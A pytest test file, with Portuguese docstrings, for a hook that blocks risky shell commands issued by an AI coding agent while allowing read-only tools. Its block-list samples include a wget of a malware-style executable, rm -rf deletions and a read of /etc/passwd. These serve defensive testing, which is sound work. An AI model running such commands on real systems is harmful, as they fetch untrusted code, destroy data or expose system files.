"""Testes unit do hook ``.opencode/hooks/dev/pre_tool_use.py`` (PLAN_SPRINT10 B.1 + Sprint 12 B12.1).

Cobre:

- Cada pattern BLOCK em `_BLOCKED_BASH` (git push, pip install, curl/wget,
  rm -rf, sqlite3 direto, ragctl {migrate|reindex|benchmark},
  src.collector --once, src.indexer.ingest, scripts do RAG meta-cognitivo,
  redirecionamento `>`, `sed -i`).
- Comandos permitidos (Read, Glob, Grep, WebFetch, Write/Edit em
  qualquer path do projeto — escopo amplo do `@dev`).
- Comandos read-only de Bash (ls, cat, pytest --collect-only).
- Comandos opt-in liberados (`python -m src.ragctl stats`,
  `python -m src.collector --diagnose-net`).
- Log escrito em ``storage/agent_hooks.log``.

Estrategia: ``subprocess.run`` com ``sys.executable`` (padrao de
``tests/integration/test_agent_dispatch.py`` e de
``tests/unit/hooks/test_code_reviewer_pre_tool_use.py``), evitando
acoplar com detalhes internos de import do hook.

> **Sprint 12 (B12.1)**: hook movido de ``.claude/hooks/dev/`` para
> ``.opencode/hooks/dev/``. Scripts TS do RAG meta migraram para
> ``.opencode/rag/``.
"""
from __future__ import annotations

import json
import os
import re
import subprocess
import sys
from pathlib import Path

import pytest

PROJECT_ROOT: Path = Path(__file__).resolve().parents[3]
HOOK_SCRIPT: Path = PROJECT_ROOT / ".opencode" / "hooks" / "dev" / "pre_tool_use.py"
LOG_PATH: Path = PROJECT_ROOT / "storage" / "agent_hooks.log"


def _run_hook(payload: dict[str, object]) -> subprocess.CompletedProcess[str]:
    proc = subprocess.run(
        [sys.executable, str(HOOK_SCRIPT)],
        input=json.dumps(payload),
        capture_output=True,
        text=True,
        env={**os.environ, "DFE_ACTIVE_AGENT": "dev"},
        check=False,
        cwd=str(PROJECT_ROOT),
        timeout=30,
    )
    return proc


def _truncate_log() -> None:
    LOG_PATH.parent.mkdir(parents=True, exist_ok=True)
    LOG_PATH.write_text("", encoding="utf-8")


@pytest.mark.parametrize(
    "cmd",
    [
        "git push origin main",
        "git push",
        "gh pr create --title x",
        "gh release create v1.0",
    ],
    ids=[
        "git_push_origin",
        "git_push_bare",
        "gh_pr_create",
        "gh_release",
    ],
)
def test_blocks_git_push_and_pr(cmd: str) -> None:
    proc = _run_hook({"tool_name": "Bash", "tool_input": {"command": cmd}})
    assert proc.returncode == 2, (
        f"`{cmd}` deveria ser bloqueado com exit 2; obtido {proc.returncode}. "
        f"stderr={proc.stderr!r}"
    )
    assert "BLOQUEADO" in proc.stderr, (
        f"`{cmd}` deveria reportar BLOQUEADO no stderr; obtido {proc.stderr!r}"
    )


@pytest.mark.parametrize(
    "cmd",
    [
        "pip install requests",
        "pip install -r requirements.txt",
        "poetry add pytest",
        "poetry install",
    ],
)
def test_blocks_pip_and_poetry(cmd: str) -> None:
    proc = _run_hook({"tool_name": "Bash", "tool_input": {"command": cmd}})
    assert proc.returncode == 2, (
        f"`{cmd}` deveria ser bloqueado; obtido {proc.returncode}. "
        f"stderr={proc.stderr!r}"
    )
    assert "BLOQUEADO" in proc.stderr


@pytest.mark.parametrize(
    "cmd",
    [
        "curl https://example.com/foo",
        "curl -L https://api.nfe.fazenda.gov.br/x",
        "wget https://malware.example/x.exe",
    ],
)
def test_blocks_curl_and_wget(cmd: str) -> None:
    proc = _run_hook({"tool_name": "Bash", "tool_input": {"command": cmd}})
    assert proc.returncode == 2, (
        f"`{cmd}` deveria ser bloqueado; obtido {proc.returncode}."
    )
    assert "BLOQUEADO" in proc.stderr


@pytest.mark.parametrize(
    "cmd",
    [
        "rm -rf build/",
        "rm -fr dist/",
        "rm -Rf .venv/",
        "rm -fR __pycache__/",
    ],
)
def test_blocks_rm_rf(cmd: str) -> None:
    proc = _run_hook({"tool_name": "Bash", "tool_input": {"command": cmd}})
    assert proc.returncode == 2, (
        f"`{cmd}` deveria ser bloqueado; obtido {proc.returncode}."
    )
    assert "BLOQUEADO" in proc.stderr


@pytest.mark.parametrize(
    "cmd",
    [
        "sqlite3 storage/dfe.db",
        "sqlite3 storage/query_cache.db",
        'python -c "import sqlite3; sqlite3.connect(\'storage/dfe.db\')"',
    ],
)
def test_blocks_sqlite_direct(cmd: str) -> None:
    proc = _run_hook({"tool_name": "Bash", "tool_input": {"command": cmd}})
    assert proc.returncode == 2, (
        f"`{cmd}` deveria ser bloqueado; obtido {proc.returncode}."
    )
    assert "BLOQUEADO" in proc.stderr


@pytest.mark.parametrize(
    "cmd",
    [
        "python -m src.collector --once",
        "python -m src.indexer.ingest",
        "python -m src.ragctl migrate",
        "python -m src.ragctl reindex",
        "python -m src.ragctl benchmark",
    ],
)
def test_blocks_rag_pipeline_commands(cmd: str) -> None:
    """Comandos do pipeline RAG NAO devem partir do agent (CLI do usuario)."""
    proc = _run_hook({"tool_name": "Bash", "tool_input": {"command": cmd}})
    assert proc.returncode == 2, (
        f"`{cmd}` deveria ser bloqueado; obtido {proc.returncode}. "
        f"stderr={proc.stderr!r}"
    )
    assert "BLOQUEADO" in proc.stderr


@pytest.mark.parametrize(
    "cmd",
    [
        "npx tsx .opencode/rag/embed.ts --file .opencode/rag/knowledge/x.md",
        "npx tsx .opencode/rag/search.ts -q foo",
        "npx tsx .opencode/rag/summarize.ts -i transcript.jsonl",
    ],
)
def test_blocks_rag_meta_cognitive_scripts(cmd: str) -> None:
    """Scripts do RAG meta sao chamados pelos hooks learning_* ou pelos
    commands `/feature /bug /duvida` explicitamente, NAO pelo agent ad-hoc."""
    proc = _run_hook({"tool_name": "Bash", "tool_input": {"command": cmd}})
    assert proc.returncode == 2, (
        f"`{cmd}` deveria ser bloqueado; obtido {proc.returncode}."
    )
    assert "BLOQUEADO" in proc.stderr


@pytest.mark.parametrize(
    "cmd",
    [
        "echo foo > file.txt",
        "cat /etc/passwd > out.txt",
        "ls -la | tee file.txt",
        "sed -i 's/a/b/' file.txt",
    ],
)
def test_blocks_redirection_and_sed_inplace(cmd: str) -> None:
    """Escrita via shell (redirecionamento ou sed -i) deve ser bloqueada."""
    proc = _run_hook({"tool_name": "Bash", "tool_input": {"command": cmd}})
    assert proc.returncode == 2, (
        f"`{cmd}` deveria ser bloqueado; obtido {proc.returncode}. "
        f"stderr={proc.stderr!r}"
    )
    assert "BLOQUEADO" in proc.stderr


@pytest.mark.parametrize(
    "tool_name",
    ["Read", "Glob", "Grep", "WebFetch", "WebSearch", "List"],
)
def test_allows_read_tools(tool_name: str) -> None:
    """Tools read-only devem passar (escopo amplo do `@dev`)."""
    proc = _run_hook({"tool_name": tool_name, "tool_input": {"path": "x"}})
    assert proc.returncode == 0, (
        f"{tool_name} deveria passar (exit 0); obtido {proc.returncode}. "
        f"stderr={proc.stderr!r}"
    )


@pytest.mark.parametrize(
    "path",
    [
        "src/collector/foo.py",
        "tests/unit/test_x.py",
        ".opencode/agent/dev.md",
        ".opencode/command/bug.md",
        ".opencode/hooks/dev/pre_tool_use.py",
        "AGENTS.md",
        "PLAN_SPRINT10.md",
        "SPEC.md",
    ],
)
def test_allows_write_tools_on_any_project_path(path: str) -> None:
    """Escopo amplo: Write/Edit em qualquer path do projeto deve passar.

    Diferenca para `code-reviewer` (que bloqueia TODA escrita): `@dev`
    e' owner de todo o projeto.

    > **Sprint 12 (B12.1)**: paths ``.claude/agents/dev.md`` e
    > ``.claude/hooks/dev/pre_tool_use.py`` removidos (unificacao). Os
    > paths canonicos correspondentes sao ``.opencode/agent/dev.md`` e
    > ``.opencode/hooks/dev/pre_tool_use.py`` (ja cobertos).
    """
    proc = _run_hook({"tool_name": "Write", "tool_input": {"file_path": path}})
    assert proc.returncode == 0, (
        f"Write em `{path}` deveria passar; obtido {proc.returncode}. "
        f"stderr={proc.stderr!r}"
    )


@pytest.mark.parametrize(
    "cmd",
    [
        "ls -la",
        "cat README.md",
        "pytest --collect-only -q",
        'python -c "import src.collector"',
        "git log --oneline -10",
        "git status --short",
        "git diff --name-only",
    ],
)
def test_allows_read_only_bash(cmd: str) -> None:
    proc = _run_hook({"tool_name": "Bash", "tool_input": {"command": cmd}})
    assert proc.returncode == 0, (
        f"`{cmd}` deveria passar; obtido {proc.returncode}. "
        f"stderr={proc.stderr!r}"
    )


@pytest.mark.parametrize(
    "cmd",
    [
        "python -m src.ragctl stats",
        "python -m src.collector --diagnose-net",
    ],
)
def test_allows_ragctl_stats_and_collector_diagnose(cmd: str) -> None:
    """Comandos de leitura/diagnostico do RAG SAO permitidos (escape hatch)."""
    proc = _run_hook({"tool_name": "Bash", "tool_input": {"command": cmd}})
    assert proc.returncode == 0, (
        f"`{cmd}` deveria passar; obtido {proc.returncode}. "
        f"stderr={proc.stderr!r}"
    )


def test_log_written_on_block() -> None:
    """Apos um BLOCK, ``storage/agent_hooks.log`` recebe linha do agente ``dev``."""
    _truncate_log()
    proc = _run_hook({
        "tool_name": "Bash",
        "tool_input": {"command": "git push origin main"},
    })
    assert proc.returncode == 2
    log_text = LOG_PATH.read_text(encoding="utf-8")
    assert "[dev]" in log_text, (
        f"Log deve conter linha `[dev] [...]` apos bloqueio; obtido:\n{log_text!r}"
    )
    assert "pre_tool_use_block" in log_text, (
        f"Log deve referenciar `pre_tool_use_block_*`; obtido:\n{log_text!r}"
    )


def test_log_written_on_redirection_block() -> None:
    """Bloqueio por redirecionamento loga com categoria dedicada."""
    _truncate_log()
    proc = _run_hook({
        "tool_name": "Bash",
        "tool_input": {"command": "echo foo > file.txt"},
    })
    assert proc.returncode == 2
    log_text = LOG_PATH.read_text(encoding="utf-8")
    assert "pre_tool_use_block_redirection" in log_text, (
        f"Log deve referenciar `pre_tool_use_block_redirection`; obtido:\n{log_text!r}"
    )


def test_no_active_agent_falls_back_permissive() -> None:
    """Sem `DFE_ACTIVE_AGENT`, hook roda em modo permissivo (regressao nao quebra)."""
    payload = json.dumps({"tool_name": "Bash", "tool_input": {"command": "ls"}})
    proc = subprocess.run(
        [sys.executable, str(HOOK_SCRIPT)],
        input=payload,
        capture_output=True,
        text=True,
        env={k: v for k, v in os.environ.items() if k != "DFE_ACTIVE_AGENT"},
        check=False,
        cwd=str(PROJECT_ROOT),
        timeout=30,
    )
    assert proc.returncode == 0, (
        f"Hook deveria cair em modo permissivo sem env var; "
        f"obtido {proc.returncode}. stderr={proc.stderr!r}"
    )


def test_empty_command_passes() -> None:
    """Payload com command vazia nao deve disparar nenhum pattern BLOCK."""
    proc = _run_hook({"tool_name": "Bash", "tool_input": {"command": ""}})
    assert proc.returncode == 0


def test_non_bash_tool_passes() -> None:
    """Tools nao-Bash (Write/Edit/etc) sao processadas pelo gate de path
    (escopo amplo: tudo passa)."""
    proc = _run_hook({
        "tool_name": "Edit",
        "tool_input": {"file_path": "src/foo.py"},
    })
    assert proc.returncode == 0


def test_no_tool_name_passes() -> None:
    """Payload sem `tool_name` nao deve quebrar."""
    proc = _run_hook({"tool_input": {"command": "ls"}})
    assert proc.returncode == 0
